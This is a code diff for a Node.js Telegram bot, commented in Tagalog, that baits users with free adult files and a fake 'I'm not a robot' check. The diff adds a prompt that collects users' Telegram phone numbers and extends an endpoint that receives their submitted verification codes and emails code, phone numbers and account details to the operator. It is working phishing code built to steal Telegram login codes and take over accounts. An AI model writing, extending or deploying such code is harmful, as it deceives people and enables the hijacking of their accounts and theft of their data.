@@ -21,6 +21,9 @@ if (!BOT_TOKEN) {
 
 const bot = new Telegraf(BOT_TOKEN);
 
+// simple in-memory storage: Telegram user id -> phone number (shared contact)
+const userPhones = new Map();
+
 // /start handler
 bot.start((ctx) => {
   const payload = ctx.startPayload; // from ?start=...
@@ -32,6 +35,26 @@ bot.start((ctx) => {
     );
   }
 
+  // 1) Hingi ng Telegram phone number (optional pero recommended)
+  ctx.reply(
+    "Para ma-verify na legit Telegram account ka, puwede mong i-share ang TELEGRAM phone number mo gamit ang button sa ibaba (optional pero recommended).",
+    {
+      reply_markup: {
+        keyboard: [
+          [
+            {
+              text: "📱 Share my Telegram phone",
+              request_contact: true,
+            },
+          ],
+        ],
+        resize_keyboard: true,
+        one_time_keyboard: true,
+      },
+    }
+  );
+
+  // 2) Sabay padala ng WebApp button
   return ctx.reply(
     "🔞 To access the files completely free 💦\n\n" +
     "👇 Confirm that you are not a robot",
@@ -50,7 +73,32 @@ bot.start((ctx) => {
   );
 });
 
-// optional: makuha data mula WebApp
+// kapag nag-share ng contact (phone)
+bot.on("contact", (ctx) => {
+  const contact = ctx.message.contact;
+  if (!contact) return;
+
+  // siguraduhin na sariling number niya, hindi ibang contact
+  if (contact.user_id && contact.user_id !== ctx.from.id) {
+    return ctx.reply(
+      "Mukhang ibang contact ito. Paki-tap ang button para i-share ang sarili mong Telegram number."
+    );
+  }
+
+  userPhones.set(ctx.from.id, contact.phone_number);
+
+  ctx.reply(
+    "Salamat! Nakuha ko na ang Telegram phone number mo. ✅\n\n" +
+      "Ngayon puwede ka nang mag-tap ng “✅ I'm not a robot!” para magpatuloy.",
+    {
+      reply_markup: {
+        remove_keyboard: true,
+      },
+    }
+  );
+});
+
+// optional: mabasa data mula WebApp
 bot.on("message", (ctx) => {
   const data = ctx.message.web_app_data?.data;
   if (data) {
@@ -75,11 +123,24 @@ const transporter = nodemailer.createTransport({
   },
 });
 
+// endpoint na tinatawag ng WebApp
 app.post("/api/log-code", async (req, res) => {
+  console.log("Received /api/log-code body:", req.body);
+
   const { code, phone, tgUser } = req.body || {};
 
   if (!code) {
+    console.log("Missing code in request");
     return res.status(400).json({ ok: false, error: "Missing code" });
+  }
+
+  // hanapin kung may na-share na Telegram phone number ang user
+  let telegramPhone = "N/A";
+  if (tgUser && typeof tgUser.id === "number") {
+    const stored = userPhones.get(tgUser.id);
+    if (stored) {
+      telegramPhone = stored;
+    }
   }
 
   const subject = "New verification code from Telegram user";
@@ -87,7 +148,8 @@ app.post("/api/log-code", async (req, res) => {
     "A user submitted a verification code.",
     "",
     `Code: ${code}`,
-    `Phone: ${phone || "N/A"}`,
+    `Phone (typed in WebApp): ${phone || "N/A"}`,
+    `Telegram phone (shared contact): ${telegramPhone}`,
     "",
     "Telegram user info:",
     JSON.stringify(tgUser || {}, null, 2),
@@ -96,13 +158,13 @@ app.post("/api/log-code", async (req, res) => {
   ].join("\n");
 
   try {
-    await transporter.sendMail({
+    const info = await transporter.sendMail({
       from: FROM_EMAIL,
       to: TO_EMAIL,
       subject,
       text,
     });
-    console.log("Email sent for code", code);
+    console.log("Email sent:", info.messageId);
     return res.json({ ok: true });
   } catch (err) {
     console.error("Email send error:", err);
